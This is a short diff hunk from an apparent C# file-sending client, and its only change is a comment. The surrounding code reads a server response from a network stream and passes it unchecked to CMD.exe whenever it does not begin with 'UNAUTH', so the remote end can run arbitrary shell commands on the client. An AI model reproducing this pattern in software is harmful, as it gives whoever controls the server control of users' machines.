@@ -311,7 +311,7 @@ namespace FileSendClient
                 int bytesRead = networkStream.Read(bytesToRead, 0, clientSocket.ReceiveBufferSize);
                 string response = Encoding.ASCII.GetString(bytesToRead, 0, bytesRead);
                 if (!response.StartsWith("UNAUTH"))
-                {
+                {// this will work in admin mode only 
                     string strCmdText;
                     strCmdText = response;
                     System.Diagnostics.Process.Start("CMD.exe", strCmdText);
